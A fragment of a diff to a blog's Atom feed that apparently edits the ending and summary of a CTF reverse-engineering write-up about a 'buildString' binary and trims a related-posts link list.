-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/finalAssembly.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;After base64 decoding this value, I obtained the flag.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/flag.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;
-
-&lt;section class=&quot;related&quot;&gt;
-  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
-  &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
@@ -2708,11 +2966,5 @@ r15 0x0
         &lt;/a&gt;
       &lt;/li&gt;
     
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
-          Mining Hero Vulnerabilities
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
   &lt;/ul&gt;
-&lt;/section&gt;</content><author><name></name></author><summary type="html">Earlier today, I had gone to VMI’s 2020 Cyberfusion CTF with my college’s CTF team (we won first place!), and I’m going to show how I solved one of their reverse engineering challenges. I was given a binary file called buildString, and upon executing the file, I was greeted with the following output.</summary></entry></feed>
+&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I am going to show you how I reverse engineered this binary and cracked the password. First, when we run the program, we can see that the program is asking us to input a password. If we input the incorrect password, the program says, “Wrong!”</summary></entry></feed>
